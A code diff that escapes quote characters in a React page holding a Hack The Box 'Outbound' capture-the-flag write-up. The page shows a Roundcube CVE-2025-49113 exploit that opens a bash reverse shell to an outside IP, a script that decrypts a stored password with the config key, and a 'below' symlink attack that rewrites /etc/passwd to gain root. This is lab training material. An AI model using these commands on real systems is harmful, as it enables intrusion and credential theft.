@@ -161,7 +161,7 @@ export default function OutboundWriteUp() {
 └──╼ [★]$ ls
 ┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads]
 └──╼ [★]$ git clone https://github.com/fearsoff-org/CVE-2025-49113
-Cloning into 'CVE-2025-49113'...
+Cloning into &apos;CVE-2025-49113&apos;...
 remote: Enumerating objects: 8, done.
 remote: Counting objects: 100% (8/8), done.
 remote: Compressing objects: 100% (7/7), done.
@@ -195,7 +195,7 @@ CVE-2025-49113.php  rc_install.sh  README.md</code>
       </p>
 
       <p className="text-neutral-300">
-        Let&apos;s craft our payload: <code className="bg-black/50 px-2 py-1 rounded">php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.218/4444 0&gt;&amp;1'"</code>
+        Let&apos;s craft our payload: <code className="bg-black/50 px-2 py-1 rounded">php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.218/4444 0&gt;&amp;1&apos;&quot;</code>
       </p>
 
       <p className="text-neutral-300">
@@ -214,7 +214,7 @@ listening on [any] 4444 ...</code>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
         <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
-└──╼ [★]$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1'"
+└──╼ [★]$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1&apos;&quot;
 ### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
 
 ### Retrieving CSRF token and session cookie...
@@ -224,7 +224,7 @@ listening on [any] 4444 ...</code>
 ### Authentication successful
 
 ### Command to be executed: 
-bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1'
+bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.10.14.91/4444 0&gt;&amp;1&apos;
 
 ### Injecting payload...
 
@@ -280,7 +280,7 @@ Password: LhKL1o9Nm3X2</code>
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
         <code>www-data@mail:/var/www/html/roundcube/public_html$ script /dev/null -c bash
 script /dev/null -c bash
-Script started, output log file is '/dev/null'.
+Script started, output log file is &apos;/dev/null&apos;.
 www-data@mail:/var/www/html/roundcube/public_html$ su tyler
 su tyler
 Password: LhKL1o9Nm3X2
@@ -301,7 +301,7 @@ tyler@mail:/var/www/html/roundcube/public_html$</code>
       </p>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
-        <code>$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';</code>
+        <code>$config[&apos;db_dsnw&apos;] = &apos;mysql://roundcube:RCDBPass2025@localhost/roundcube&apos;;</code>
       </pre>
 
       <p className="text-neutral-300">
@@ -331,7 +331,7 @@ Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04
 
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.
 
 MariaDB [(none)]&gt; SHOW TABLES;
 SHOW TABLES;
@@ -339,7 +339,7 @@ ERROR 1046 (3D000): No database selected</code>
       </pre>
 
       <p className="text-neutral-300">
-        We get "No database selected", so let&apos;s select the database mentioned in the php config file:
+        We get &quot;No database selected&quot;, so let&apos;s select the database mentioned in the php config file:
       </p>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
@@ -382,7 +382,7 @@ MariaDB [roundcube]&gt;</code>
       </p>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
-        <code>$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
+        <code>$config[&apos;des_key&apos;] = &apos;rcmail-!24ByteDESkey*Str&apos;;</code>
       </pre>
 
       <p className="text-neutral-300">
@@ -390,11 +390,11 @@ MariaDB [roundcube]&gt;</code>
       </p>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
-        <code>// This key is used to encrypt the users imap password which is stored
+        <code>{`// This key is used to encrypt the users imap password which is stored
 // in the session record. For the default cipher method it must be
 // exactly 24 characters long.
 // YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
-$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';`}</code>
       </pre>
 
       <p className="text-neutral-300">
@@ -402,7 +402,7 @@ $config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
       </p>
 
       <p className="text-neutral-300">
-        The comments also mentioned: "session record", so lets take a look into the session table in MySQL:
+        The comments also mentioned: &quot;session record&quot;, so lets take a look into the session table in MySQL:
       </p>
 
       <p className="text-neutral-300">
@@ -475,7 +475,7 @@ $config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
       </p>
 
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
-        <code>$config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
+        <code>$config[&apos;des_key&apos;] = &apos;rcmail-!24ByteDESkey*Str&apos;;</code>
       </pre>
 
       <p className="text-neutral-300">
@@ -495,10 +495,10 @@ $config['des_key'] = 'rcmail-!24ByteDESkey*Str';</code>
 import base64
 
 # Given key from config
-key = b'rcmail-!24ByteDESkey*Str'
+key = b&apos;rcmail-!24ByteDESkey*Str&apos;
 
 # The encrypted password string
-enc_pass_b64 = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
+enc_pass_b64 = &quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;
 
 # Decode base64
 enc_pass = base64.b64decode(enc_pass_b64)
@@ -509,9 +509,9 @@ cipher = DES3.new(key, DES3.MODE_CBC, iv)
 plaintext = cipher.decrypt(ciphertext)
 
 pad_len = plaintext[-1]
-password = plaintext[:-pad_len].decode('utf-8')
+password = plaintext[:-pad_len].decode(&apos;utf-8&apos;)
 
-print("Decrypted password:", password)</code>
+print(&quot;Decrypted password:&quot;, password)</code>
       </pre>
 
       <p className="text-neutral-300">
@@ -550,7 +550,7 @@ Received: by outbound.htb (Postfix, from userid 1000)
 To: jacob@outbound.htb
 Subject: Important Update
 MIME-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
 Content-Transfer-Encoding: 8bit
 Message-Id: &lt;20250607140058.B32C410248D@outbound.htb&gt;
 Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
@@ -580,7 +580,7 @@ Received: by outbound.htb (Postfix, from userid 1002)
 To: jacob@outbound.htb
 Subject: Unexpected Resource Consumption
 MIME-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
 Content-Transfer-Encoding: 8bit
 Message-Id: &lt;20250608120945.1487E22C@outbound.htb&gt;
 Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
@@ -614,7 +614,7 @@ jacob@mail:~/mail/INBOX$</code>
       <pre className="bg-black/50 p-4 rounded-lg overflow-x-auto">
         <code>┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~/Downloads/CVE-2025-49113]
 └──╼ [★]$ ssh jacob@10.129.129.153
-jacob@10.129.129.153's password: 
+jacob@10.129.129.153&apos;s password: 
 Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -683,12 +683,12 @@ User jacob may run the following commands on outbound:
 /home/s1dd
 ┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
 └──╼ [★]$ scp /home/s1dd/exploit.py jacob@10.129.129.153:/
-jacob@10.129.129.153's password: 
-scp: dest open "/exploit.py": Permission denied
+jacob@10.129.129.153&apos;s password: 
+scp: dest open &quot;/exploit.py&quot;: Permission denied
 scp: failed to upload file /home/s1dd/exploit.py to /
 ┌─[eu-dedivip-2]─[10.10.14.91]─[s1dd@htb-v5mpmuvbar]─[~]
 └──╼ [★]$ scp /home/s1dd/exploit.py jacob@10.129.129.153:~
-jacob@10.129.129.153's password: 
+jacob@10.129.129.153&apos;s password: 
 exploit.py                                    100% 3255   382.2KB/s   00:00</code>
       </pre>
 
@@ -711,16 +711,16 @@ jacob@outbound:~$ python3 exploit.py
 [*] Starting exploitation...
 [+] Wrote malicious passwd line to /tmp/attacker
 [+] Symlink set: /var/log/below/error_root.log -&gt; /etc/passwd
-[*] Executing 'below record' as root to trigger logging...
+[*] Executing &apos;below record&apos; as root to trigger logging...
 Jul 16 16:06:32.241 DEBG Starting up!
 Jul 16 16:06:32.241 ERRO 
 ----------------- Detected unclean exit ---------------------
 Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752624000: EAGAIN: Try again
 -------------------------------------------------------------
-[+] 'below record' executed.
+[+] &apos;below record&apos; executed.
 [*] Appending payload into /etc/passwd via symlink...
 [+] Payload appended successfully.
-[*] Attempting to switch to root shell via 'su attacker'...
+[*] Attempting to switch to root shell via &apos;su attacker&apos;...
 root@outbound:/home/jacob# ls
 exploit.py  user.txt
 root@outbound:/home/jacob# cd root/
